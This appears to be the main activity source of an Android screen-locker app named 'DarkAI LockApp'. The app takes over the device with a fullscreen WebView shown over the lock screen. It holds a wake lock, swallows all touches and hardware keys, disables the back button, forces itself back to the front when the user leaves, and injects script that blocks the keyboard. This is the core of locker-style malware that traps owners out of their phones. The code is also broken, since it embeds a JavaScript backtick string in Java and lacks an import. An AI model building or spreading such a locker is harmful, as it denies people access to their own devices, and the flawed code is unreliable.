package com.darkai.lockapp;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.PowerManager;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class MainActivity extends Activity {

    private WebView webView;
    private PowerManager.WakeLock wakeLock;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Keep screen on
        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );
        
        // Hide navigation bar
        View decorView = getWindow().getDecorView();
        decorView.setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_FULLSCREEN |
            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
            View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
        );
        
        // Acquire wake lock
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK |
            PowerManager.ACQUIRE_CAUSES_WAKEUP |
            PowerManager.ON_AFTER_RELEASE,
            "DarkAI:LockApp"
        );
        wakeLock.acquire();
        
        // Initialize WebView
        webView = new WebView(this);
        
        // WebView settings
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowContentAccess(true);
        webSettings.setMediaPlaybackRequiresUserGesture(false);
        webSettings.setSupportZoom(false);
        webSettings.setBuiltInZoomControls(false);
        webSettings.setDisplayZoomControls(false);
        
        // Disable text selection
        webView.setOnLongClickListener(v -> true);
        
        // Set WebView client
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                // Block all external URLs
                return true;
            }
            
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                // Inject additional JavaScript
                injectCustomJS();
            }
        });
        
        webView.setWebChromeClient(new WebChromeClient());
        
        // Load local HTML file or URL
        // For local: webView.loadUrl("file:///android_asset/index.html");
        // For remote: webView.loadUrl("https://your-server.com/lock");
        webView.loadUrl("file:///android_asset/index.html");
        
        // Block touch events at WebView level
        webView.setOnTouchListener((v, event) -> {
            // Consume all touch events
            return true;
        });
        
        setContentView(webView);
        
        // Start lock service
        startService(new Intent(this, LockService.class));
    }
    
    private void injectCustomJS() {
        // Inject additional JavaScript to strengthen lock
        String jsCode = `
            // Prevent right click
            document.addEventListener('contextmenu', e => e.preventDefault());
            
            // Prevent text selection
            document.styleSheets[0].insertRule('* { user-select: none !important; }', 0);
            
            // Block keyboard
            document.addEventListener('keydown', e => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            });
            
            // Force fullscreen
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            }
            
            console.log('DARK AI LOCK INJECTED');
        `;
        
        webView.evaluateJavascript(jsCode, null);
    }
    
    // Disable back button
    @Override
    public void onBackPressed() {
        // Do nothing
    }
    
    // Disable recent apps button
    @Override
    protected void onUserLeaveHint() {
        super.onUserLeaveHint();
        // Bring back to front
        ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
        if (am != null) {
            am.moveTaskToFront(getTaskId(), 0);
        }
    }
    
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        // Block all hardware keys
        if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN ||
            keyCode == KeyEvent.KEYCODE_VOLUME_UP ||
            keyCode == KeyEvent.KEYCODE_POWER ||
            keyCode == KeyEvent.KEYCODE_HOME) {
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    
    @Override
    protected void onDestroy() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        super.onDestroy();
    }
}